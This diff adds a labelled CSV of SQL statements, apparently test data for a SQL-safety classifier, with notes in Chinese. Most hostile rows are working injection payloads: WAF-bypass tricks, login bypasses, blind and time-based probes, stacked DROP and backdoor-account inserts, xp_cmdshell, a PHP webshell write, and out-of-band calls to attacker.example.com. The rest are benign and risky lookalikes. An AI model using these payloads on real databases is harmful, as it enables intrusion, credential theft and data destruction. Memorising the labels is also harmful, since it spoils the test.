@@ -1,0 +1,80 @@
+id,family,class,sql,note
+1,waf_comment,hostile,"SELECT * FROM news WHERE id = 1 UN/**/ION SE/**/LECT 1,2,3",OWASP: /**/ 拆关键字
+2,waf_comment,hostile,SELECT/*avoid-spaces*/password/**/FROM/**/members,Invicti: 注释代替空格
+3,waf_comment,hostile,SELECT * FROM users WHERE id = 1 UNION/*!50001SELECT*/ * FROM admin,MySQL 版本注释 /*!*/
+4,waf_comment,hostile,DROP/*comment*/sampletable,Invicti: 注释插入 DDL
+5,waf_comment,hostile,SELECT * FROM t WHERE id=.1 UNION/*.1*/SELECT-.1,waf-bypass: 小数点绕过
+6,waf_comment,hostile,"SELECT * FROM t WHERE id = 1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4",OWASP: 十六进制+版本注释
+7,waf_keyword,hostile,"SELECT * FROM news WHERE id = 1 UnIoN SeLecT 1,2,3",OWASP: 大小写混写
+8,waf_keyword,hostile,"SELECT * FROM news WHERE id = 1 UNunionION SEselectLECT 1,2,3",OWASP: 关键字自嵌套，过滤器删一次反而合法
+9,waf_keyword,hostile,SELECT * FROM t WHERE id = 1 UNION DISTINCT SELECT 1,waf-bypass: DISTINCT 代替 ALL
+10,waf_keyword,hostile,SELECT * FROM t WHERE id = 1e1 UNION SELECT 1,waf-bypass: 科学计数法粘连
+11,waf_keyword,hostile,SELECT{x table_name}FROM{x information_schema.tables},waf-bypass: MySQL 花括号语法
+12,waf_encoding,hostile,SELECT * FROM t WHERE name = 'a' OR 'a' = x'61',waf-bypass: 十六进制字面量比较
+13,waf_encoding,hostile,SELECT * FROM t WHERE id = 1 OR 0x50 = 0x50,OWASP: 十六进制恒真
+14,waf_encoding,hostile,SELECT LOAD_FILE(0x633A5C626F6F742E696E69),Invicti: 十六进制隐藏路径
+15,waf_encoding,hostile,SELECT CHAR(75)+CHAR(76)+CHAR(77),Invicti: CHAR 拼字符串
+16,waf_encoding,hostile,SELECT 0x457578,Invicti: 裸十六进制
+17,waf_encoding,hostile,SELECT * FROM t WHERE id = 1 OR 1 RLIKE 1,waf-bypass: RLIKE 代替 =
+18,waf_encoding,hostile,SELECT * FROM users WHERE name LIKE 'admin' AND pw LIKE 'x',LIKE 代替 = 绕等号过滤
+19,auth_bypass,hostile,SELECT * FROM users WHERE user = 'admin'--' AND pass = 'x',Invicti: admin'--
+20,auth_bypass,hostile,SELECT * FROM users WHERE user = 'admin'#' AND pass = 'x',Invicti: admin'#
+21,auth_bypass,hostile,SELECT * FROM users WHERE user = '' OR 1=1--' AND pass = '',经典恒真
+22,auth_bypass,hostile,SELECT * FROM users WHERE user = '') OR ('1'='1'--',括号闭合恒真
+23,auth_bypass,hostile,SELECT * FROM users WHERE name = 'Book' OR 'x'='x',Invicti: 字符串恒真
+24,auth_bypass,hostile,SELECT * FROM members WHERE id = 5-1,Invicti: 算术探测
+25,union_based,hostile,"SELECT id, name FROM news UNION SELECT 1, 'anotheruser'",Invicti: 伪造行
+26,union_based,hostile,SELECT a FROM t UNION SELECT SUM(columntofind) FROM users,Invicti: 探测列
+27,union_based,hostile,SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members,Invicti: COLLATE 绕类型校验
+28,union_based,hostile,"SELECT * FROM t WHERE id = '' UNION SELECT user, database() FROM users--'",waf-bypass: 带库信息外带
+29,union_based,hostile,"SELECT * FROM products WHERE id = -1 UNION ALL SELECT table_name, column_name FROM information_schema.columns",负 ID 强制走 UNION 分支
+30,error_based,hostile,"SELECT extractvalue(rand(0), concat(0x0a, version()))",waf-bypass: extractvalue 报错外带
+31,error_based,hostile,"SELECT updatexml(0, concat(0x0a, user()), 0)",waf-bypass: updatexml 报错外带
+32,error_based,hostile,"SELECT * FROM t WHERE id = 1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)",经典 floor 报错注入
+33,blind_boolean,hostile,"SELECT * FROM t WHERE id = 1 AND MID(VERSION(), 1, 1) = '5'",waf-bypass: 逐位比版本
+34,blind_boolean,hostile,"SELECT * FROM t WHERE id = 1 AND ASCII(LOWER(MID((SELECT pw FROM users LIMIT 1), 1, 1))) = 74",OWASP: ascii+mid 逐位
+35,blind_boolean,hostile,"SELECT IF(1=1, 'true', 'false')",Invicti: IF 探测
+36,blind_boolean,hostile,"SELECT * FROM t WHERE id = 1 AND SUBSTR((SELECT password FROM users LIMIT 1), 1, 1) > 'm'",二分法逐位
+37,blind_boolean,hostile,SELECT * FROM t WHERE id = 1 AND (SELECT COUNT(*) FROM information_schema.tables) > 100,探测表数量
+38,blind_time,hostile,SELECT * FROM t WHERE id = 1; WAITFOR DELAY '0:0:10'--,Invicti: MSSQL 延时
+39,blind_time,hostile,SELECT SLEEP(10),Invicti: MySQL 延时
+40,blind_time,hostile,SELECT pg_sleep(10),Invicti: Postgres 延时
+41,blind_time,hostile,"SELECT * FROM t WHERE id = 1 AND IF(EXISTS(SELECT * FROM users WHERE username = 'root'), BENCHMARK(1000000000, MD5(1)), 0)",Invicti: BENCHMARK 延时
+42,blind_time,hostile,SELECT * FROM t WHERE id = 1 AND (SELECT * FROM (SELECT SLEEP(5))a),子查询裹 SLEEP
+43,stacked,hostile,SELECT * FROM members; DROP TABLE members--,Invicti: 堆叠 DROP
+44,stacked,hostile,SELECT * FROM t WHERE id = 10; DELETE FROM members--,堆叠删库
+45,stacked,hostile,SELECT 1; UPDATE users SET role = 'admin' WHERE id = 1--,堆叠提权
+46,stacked,hostile,"SELECT 1; INSERT INTO users (name, role) VALUES ('backdoor', 'admin')--",堆叠植入后门账号
+47,oob_rce,hostile,SELECT * FROM t; DECLARE @q varchar(1024); SET @q = '\\attacker.example.com\test.txt'; EXEC master..xp_dirtree @q,Invicti: DNS 带外
+48,oob_rce,hostile,"SELECT * FROM OPENROWSET('SQLOLEDB', 'attacker.example.com';'sa';'pwd', 'SELECT 1')",Invicti: OPENROWSET 外连
+49,oob_rce,hostile,EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:',Invicti: MSSQL 命令执行
+50,oob_rce,hostile,SELECT * FROM users INTO OUTFILE '/var/www/html/dump.txt',导出到 Web 目录
+51,oob_rce,hostile,SELECT '<?php system($_GET[0]); ?>' INTO DUMPFILE '/var/www/shell.php',写 WebShell
+52,oob_rce,hostile,COPY (SELECT '') TO PROGRAM 'curl attacker.example.com',Postgres COPY TO PROGRAM
+53,data_exfil,hostile,"SELECT email, password_hash FROM users",整表拖凭据：语法干净，注入尺子量不出来
+54,data_exfil,hostile,"SELECT id, credit_card, cvv FROM payments",整表拖卡号
+55,data_exfil,hostile,SELECT * FROM users WHERE 1 = 1,无条件全表导出
+56,data_exfil,hostile,"SELECT api_key, secret FROM shops ORDER BY created_at DESC",拖全部商户密钥
+57,data_exfil,hostile,"SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%password%'",翻库找密码字段
+58,data_exfil,hostile,"SELECT user, host, authentication_string FROM mysql.user",读 MySQL 账号表
+59,data_exfil,hostile,SELECT * FROM pg_shadow,读 Postgres 口令表
+60,legit_lookalike,safe,"SELECT id, name FROM active_users UNION ALL SELECT id, name FROM archived_users ORDER BY name",合法 UNION：归并两张表做报表
+61,legit_lookalike,safe,SELECT COUNT(*) AS total FROM orders WHERE status = 'paid' -- 只统计已付款,合法尾注释
+62,legit_lookalike,safe,"/* 月度对账 */ SELECT shop_id, SUM(amount) FROM payments WHERE created_at >= '2026-09-01' GROUP BY shop_id",合法块注释
+63,legit_lookalike,safe,SELECT password_updated_at FROM users WHERE id = 42,列名含 password 但只读时间戳
+64,legit_lookalike,safe,"SELECT id, last_login FROM users WHERE email = 'alice@example.com'",按邮箱查单人
+65,legit_lookalike,safe,"SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'orders'",迁移脚本查自己表的结构
+66,legit_lookalike,safe,SELECT * FROM products WHERE description LIKE '%union jack%',搜索词里含 union
+67,legit_lookalike,safe,SELECT name FROM shops WHERE name = 'O''Brien Coffee',合法转义单引号
+68,legit_lookalike,safe,SELECT id FROM orders WHERE created_at BETWEEN '2026-01-01' AND '2026-09-01' AND amount > 0,区间查询
+69,legit_lookalike,safe,"SELECT u.id, COUNT(o.id) FROM users u LEFT JOIN orders o ON o.user_id = u.id GROUP BY u.id HAVING COUNT(o.id) = 0",找零订单用户
+70,legit_lookalike,safe,SELECT SLEEP(0),健康检查用的 SLEEP(0)，无延时意图
+71,legit_lookalike,safe,SELECT 1,连接探活
+72,legit_risky,risky,ALTER TABLE orders ADD COLUMN refund_reason VARCHAR(255) NULL,加列：正常迁移但改结构
+73,legit_risky,risky,"CREATE INDEX idx_orders_shop_created ON orders (shop_id, created_at)",建索引：大表会锁
+74,legit_risky,risky,DELETE FROM sessions WHERE expires_at < '2026-01-01',清理过期会话：有 WHERE 但量大
+75,legit_risky,risky,UPDATE users SET status = 'inactive' WHERE last_login < '2024-01-01',批量置灰：有 WHERE 但影响面广
+76,legit_risky,risky,TRUNCATE TABLE import_staging,清空中转表：合法但不可逆
+77,legit_risky,risky,GRANT SELECT ON analytics.* TO 'bi_reader'@'10.0.%',给 BI 只读权限
+78,legit_risky,risky,SET GLOBAL foreign_key_checks = 0,关外键校验：迁移常用但危险
+79,legit_risky,risky,DROP TABLE IF EXISTS tmp_migration_backup,删临时表
